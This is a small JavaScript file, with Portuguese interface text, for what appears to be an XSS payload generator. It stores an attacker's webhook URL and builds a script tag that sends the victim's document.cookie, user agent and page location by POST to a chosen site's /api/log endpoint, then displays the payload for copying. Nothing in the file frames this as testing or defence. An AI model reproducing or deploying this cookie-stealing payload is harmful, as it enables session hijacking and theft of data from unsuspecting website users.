const webhookKey = 'webhook_dk';

function saveWebhook() {
  const url = document.getElementById("webhookInput").value.trim();
  if (!url.startsWith("https://")) return alert("Webhook inválido");
  localStorage.setItem(webhookKey, url);
  alert("Webhook salvo!");
}

function gerarScript() {
  const site = document.getElementById("siteInput").value.trim();
  const webhook = localStorage.getItem(webhookKey);
  if (!site || !webhook) return alert("Preencha o site e salve o webhook primeiro.");

  const script = `<script>fetch('${site}/api/log', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,user:navigator.userAgent,location:window.location.href})})</script>`;
  document.getElementById("xssCode").innerText = script;
}

function changeTab(e) {
  document.querySelectorAll(".tab-button").forEach(btn => btn.classList.remove("active"));
  document.querySelectorAll(".tab-content").forEach(tab => tab.classList.remove("active"));
  e.target.classList.add("active");
  document.getElementById(e.target.dataset.tab).classList.add("active");
}

document.querySelectorAll(".tab-button").forEach(btn => {
  btn.addEventListener("click", changeTab);
});
